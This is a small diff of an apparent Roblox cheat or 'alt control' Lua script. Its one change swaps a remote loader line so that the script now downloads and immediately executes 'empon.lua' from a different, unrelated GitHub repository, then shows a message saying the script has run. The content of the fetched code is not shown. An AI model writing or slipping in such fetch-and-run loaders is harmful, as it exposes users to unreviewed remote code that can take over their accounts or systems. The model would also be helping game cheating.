@@ -673,5 +673,5 @@ local id_ = {
 }
 return id_
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/grandpascripts/error502/main/AntiAfk.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sembondg9044/mentatn/main/empon.lua"))()
 game.StarterGui:SetCore("SendNotification", {Title = "Melzon Alt Control!", Text = "The Script Has Been Executed", Duration = 10})
